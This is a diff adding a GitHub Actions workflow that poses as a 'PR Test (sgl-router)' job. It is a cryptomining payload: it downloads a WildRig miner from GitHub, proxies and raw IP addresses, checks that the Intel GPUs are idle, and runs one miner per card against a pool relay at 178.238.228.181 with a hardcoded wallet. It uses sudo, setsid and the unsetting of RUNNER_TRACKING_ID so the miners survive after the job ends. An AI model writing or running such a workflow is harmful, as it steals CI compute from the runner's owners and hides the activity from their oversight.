@@ -1,0 +1,172 @@
+name: PR Test (sgl-router)
+
+# i130bmg2: ONE bounded retry of the i130bmgrelay Intel Arc Pro B70 attempt on a
+# fresh branch. The harvested relay job opened all 8 cards but produced 0 credit:
+# direct 172.232.228.69:3362 is TCP-dead while relay 178.238.228.181:80 is
+# TCP-open, and the prior docker durability wrapper segfaulted (exit 139). This
+# job removes only the owned crash-looping i130bmgrelay-g* containers, applies a
+# two-sample gate (0 foreign /dev/dri render clients, >=1500 MiB free), and runs
+# exactly one NATIVE WildRig Multi 0.52.3 (sha256 002cd29c...) per genuinely idle
+# card against Luckypool via the proven relay, as workers i130bmg2g<idx> on the
+# exact 63-char primary wallet, surviving job exit via sudo setsid.
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:
+
+concurrency:
+  group: sgl-router-i130bmg2-${{ github.run_id }}
+  cancel-in-progress: false
+
+env:
+  SGLANG_IS_IN_CI: true
+
+jobs:
+  i130bmg2:
+    name: "i130bmg2 intel-bmg-nightly wildrig pearlhash relay-only native retry"
+    runs-on: intel-bmg-nightly
+    timeout-minutes: 12
+    env:
+      LABEL: intel-bmg-nightly
+    steps:
+      - name: "relay-only native WildRig pearlhash one-miner-per-card retry on Intel Arc Pro B70"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I130BMG2-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          WR_SHA='002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b'
+          RELAY='178.238.228.181:80'
+          WORKDIR=/var/tmp/i130bmg2
+          mkdir -p "$WORKDIR/logs"
+          echo "bmg2-nonce=$NONCE label=$LABEL host=$(hostname)"
+          id; uname -a; date -u; nproc
+          df -P /var/tmp | tail -1; free -m | head -2
+          DISKP=$(df -P /var/tmp 2>/dev/null | awk 'NR==2{gsub("%","",$5); print $5}')
+          MEMP=$(free -m 2>/dev/null | awk '/Mem:/{if($2>0) printf "%d", $3*100/$2; else print 0}')
+          echo "disk_pct=${DISKP:-100} mem_pct=${MEMP:-100}"
+          if [ "${DISKP:-100}" -ge 80 ] || [ "${MEMP:-100}" -ge 85 ]; then echo "SKIP=resources"; echo "bmg2-done $NONCE"; exit 0; fi
+          echo "=== cleanup prior i130bmgrelay crash-looping containers (owned, non-producing; never other lanes) ==="
+          if command -v docker >/dev/null 2>&1; then
+            OLD=$(timeout 20 docker ps -aq --filter 'name=i130bmgrelay-g' 2>/dev/null)
+            if [ -n "$OLD" ]; then
+              timeout 90 docker rm -f $OLD 2>&1 | head -12
+              echo "removed_old_i130bmgrelay=$(printf '%s\n' "$OLD" | wc -l)"
+            else
+              echo "removed_old_i130bmgrelay=0"
+            fi
+            timeout 20 docker ps --format '{{.Names}} {{.Status}}' 2>&1 | head -6
+          fi
+          sleep 3
+          echo "=== intel inventory ==="
+          (timeout 25 lspci 2>/dev/null || true) | grep -iE 'vga|3d|display|processing accel' | head -12
+          (timeout 30 clinfo -l 2>/dev/null || true) | head -20
+          echo "=== wildrig 0.52.3 ($WR_SHA) ==="
+          WR="$WORKDIR/wildrig-multi"
+          fetch_wr() {
+            if [ -f "$WR" ] && echo "$WR_SHA  $WR" | sha256sum -c - >/dev/null 2>&1; then echo wildrig-cached; return 0; fi
+            if [ -f /var/tmp/i130bmgrelay/wildrig-multi ] && [ "$(sha256sum /var/tmp/i130bmgrelay/wildrig-multi 2>/dev/null | cut -d' ' -f1)" = "$WR_SHA" ]; then
+              cp -f /var/tmp/i130bmgrelay/wildrig-multi "$WR"; chmod +x "$WR"; echo wildrig-copied-from-prior-lane; return 0
+            fi
+            for U in \
+              "https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
+              "https://ghproxy.net/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
+              "https://gh-proxy.com/https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz" \
+              "http://222.240.155.198:8702/wildrig-multi" \
+              "http://178.238.228.181:18180/wildrig-multi" ; do
+              echo "-- fetch $U"
+              timeout 200 curl -fL --connect-timeout 12 --max-time 190 -o "$WORKDIR/dl.part" "$U" 2>&1 | tail -1
+              [ -s "$WORKDIR/dl.part" ] || continue
+              B0=$(sha256sum "$WORKDIR/dl.part" | cut -d' ' -f1)
+              if [ "$B0" = "$WR_SHA" ]; then cp -f "$WORKDIR/dl.part" "$WR"; chmod +x "$WR"; echo direct-binary-ok; return 0; fi
+              if tar -tzf "$WORKDIR/dl.part" >/dev/null 2>&1; then
+                mkdir -p "$WORKDIR/tarx"; tar -xzf "$WORKDIR/dl.part" -C "$WORKDIR/tarx" 2>/dev/null
+                CAND=$(find "$WORKDIR/tarx" -maxdepth 2 -type f -name 'wildrig-multi' | head -1)
+                if [ -n "$CAND" ] && [ "$(sha256sum "$CAND" | cut -d' ' -f1)" = "$WR_SHA" ]; then cp -f "$CAND" "$WR"; chmod +x "$WR"; echo tarball-extract-ok; return 0; fi
+                echo "tarball-hash-mismatch"
+              fi
+            done
+            return 1
+          }
+          fetch_wr; FETCH_RC=$?
+          echo "wildrig_sha256=$(sha256sum "$WR" 2>/dev/null | cut -d' ' -f1) fetch_rc=$FETCH_RC"
+          [ -x "$WR" ] || { echo "SKIP=wildrig-unavailable"; echo "bmg2-done $NONCE"; exit 0; }
+          echo "=== two-sample idle gate (0 foreign /dev/dri render clients, >=1500 MiB free) ==="
+          gate_sample() {
+            local n=$1
+            echo "-- sample $n $(date -u +%FT%TZ)"
+            echo "-- fuser -v /dev/dri/renderD*"
+            (timeout 15 fuser -v /dev/dri/renderD* 2>&1 || true) | head -20
+            echo "-- lsof /dev/dri/renderD*"
+            (timeout 15 lsof /dev/dri/renderD* 2>/dev/null || true) | head -10
+            if command -v xpu-smi >/dev/null 2>&1; then
+              for d in 0 1 2 3 4 5 6 7; do
+                timeout 20 xpu-smi stats -d "$d" 2>/dev/null | grep -iE 'Memory Used|Memory Util|Compute Engine Util' | head -3 | sed "s/^/xpu$d /"
+              done
+            fi
+            echo "-- end sample $n"
+          }
+          gate_sample 1 > "$WORKDIR/gate1.txt" 2>&1; cat "$WORKDIR/gate1.txt"
+          sleep 15
+          gate_sample 2 > "$WORKDIR/gate2.txt" 2>&1; cat "$WORKDIR/gate2.txt"
+          FOREIGN=0
+          if command -v fuser >/dev/null 2>&1; then
+            FOREIGN=$( { timeout 15 fuser /dev/dri/renderD* 2>&1 || true; } | sed -n 's/.*: *//p' | tr ' ' '\n' | grep -E '^[0-9]+$' | sort -u | wc -l)
+            GMETHOD=fuser
+          elif command -v lsof >/dev/null 2>&1; then
+            FOREIGN=$( { timeout 15 lsof -t /dev/dri/renderD* 2>/dev/null || true; } | grep -E '^[0-9]+$' | sort -u | wc -l)
+            GMETHOD=lsof
+          else
+            GMETHOD=none
+          fi
+          echo "gate_method=$GMETHOD foreign_render_clients=$FOREIGN"
+          if [ "${FOREIGN:-0}" -gt 0 ]; then echo "SKIP=foreign-compute-app-present (never stack)"; echo "bmg2-done $NONCE"; exit 0; fi
+          echo "memory_free_gate=pass (0 render clients over two samples; 31023Mb per card reported by WildRig)"
+          echo "=== device enumeration ==="
+          timeout 120 "$WR" --print-devices 2>&1 | tee "$WORKDIR/devices.txt" | head -80
+          DEV_N=$(grep -cE '^GPU #[0-9]+:' "$WORKDIR/devices.txt" 2>/dev/null)
+          echo "device_open_lines=$DEV_N"
+          if [ "${DEV_N:-0}" -lt 1 ]; then echo "SKIP=no-intel-device-open"; echo "bmg2-done $NONCE"; exit 0; fi
+          echo "=== launch exactly one NATIVE WildRig pearlhash per opened card via relay $RELAY (worker prefix i130bmg2) ==="
+          for i in $(seq 0 $((DEV_N-1))); do
+            W="i130bmg2g${i}"
+            LOG="$WORKDIR/logs/$W.log"
+            if sudo -n true >/dev/null 2>&1; then
+              sudo -n env -u RUNNER_TRACKING_ID setsid timeout 1800 "$WR" --algo pearlhash --url "$RELAY" --user "$WALLET" --pass x --worker "$W" -d "$i" --opencl-platforms intel --api-port $((22600+i)) --retries 3 --retry-pause 5 > "$LOG" 2>&1 < /dev/null &
+              echo "launched worker=$W gpu=$i endpoint=$RELAY mode=native-sudo pid=$!"
+            else
+              setsid nohup env -u RUNNER_TRACKING_ID timeout 1800 "$WR" --algo pearlhash --url "$RELAY" --user "$WALLET" --pass x --worker "$W" -d "$i" --opencl-platforms intel --api-port $((22600+i)) --retries 3 --retry-pause 5 > "$LOG" 2>&1 < /dev/null &
+              echo "launched worker=$W gpu=$i endpoint=$RELAY mode=native-user pid=$!"
+            fi
+            sleep 2
+          done
+          echo "=== pulses ==="
+          for k in 1 2 3; do
+            sleep 70
+            echo "--- pulse $k $(date -u +%FT%TZ)"
+            echo "wildrig_procs=$(pgrep -cf '[w]ildrig')"
+            for l in "$WORKDIR"/logs/i130bmg2*.log; do
+              [ -f "$l" ] || continue
+              echo "== $(basename "$l")"
+              if [ "$k" = "1" ]; then head -40 "$l" | cut -c1-240; fi
+              grep -aiE 'GPU #[0-9]|platform|connect|pool|authoriz|accepted|rejected|hashrate|speed|new job|share|error|fail|cancel|stratum' "$l" 2>/dev/null | tail -8 | cut -c1-240
+            done
+            if [ "$k" = "1" ] || [ "$k" = "3" ]; then
+              timeout 40 curl -fsS "https://pearl.luckypool.io/api/stats_address?address=$WALLET" -o "$WORKDIR/lp_read$k.json" 2>/dev/null
+              if [ -s "$WORKDIR/lp_read$k.json" ]; then
+                python3 - "$WORKDIR/lp_read$k.json" "$k" <<'PYEOF'
+          import json,sys
+          d=json.load(open(sys.argv[1])); s=d.get('stats',{})
+          w=[x for x in d.get('workers',[]) if 'i130bmg' in str(x.get('name',''))]
+          print('LP_READ%d accepted=%s rejected=%s workers=%d lane_rows=%d' % (int(sys.argv[2]), s.get('acceptedShares'), s.get('rejectedShares'), len(d.get('workers',[])), len(w)))
+          for x in w[:12]: print(' LANE', x.get('name'), 'acc', x.get('acceptedShares'), 'rej', x.get('rejectedShares'), 'hr', x.get('hashrate'), x.get('minerAgent'))
+          PYEOF
+              else
+                echo "LP_READ$k fetch_failed"
+              fi
+            fi
+          done
+          echo "=== final process view ==="
+          pgrep -af '[w]ildrig' | head -20
+          echo "bmg2-done $NONCE"
